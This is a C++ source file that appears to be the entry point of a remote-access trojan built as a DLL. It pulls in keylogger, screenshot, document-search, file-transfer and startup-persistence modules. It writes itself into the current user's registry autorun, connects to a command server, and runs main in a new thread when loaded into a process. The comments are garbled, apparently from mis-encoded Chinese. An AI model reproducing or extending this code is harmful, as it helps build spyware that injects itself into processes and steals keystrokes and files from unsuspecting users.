#include <iostream>
#include <WinSock2.h>
#include <fstream>
#include <cstring>
#include "Protocol.h"
#include "struct.h"
#include "screenShot.h"
#include "documentLookUp.h"
#include "reg.h"
#include "autoStartupDir.h"
#include "fileTrans.h"
#include "keylogger.h"
#include "rapidjson/prettywriter.h"
#include "rapidjson/document.h"
#include "rapidjson/istreamwrapper.h"


int main() {
	Protocol* p = new Protocol("127.0.0.1", 10553);
	int status = Reg_CurrentUser(_pgmptr, (char*)"rc");
	if (!status) {
		cout << "ע�뵱ǰ�û��������ɹ�";
	}
	if (p->Connect() && p->Ping("HAHAHA"))
		p->run();

}



BOOL APIENTRY DllMain(HINSTANCE hInstance, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	HANDLE hThread;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		// ����һ�����߳�������main����Ȼ��Դ�������Ῠ����֮��main����Ϊһ���������̴߳��ڣ���explorer.exe���̱�����֮ǰ�������
		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
		if (hThread) MessageBoxA(NULL, "create thread success", "Success", MB_OK);
		else MessageBoxA(NULL, "create thread fail", "Fail", MB_OK);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}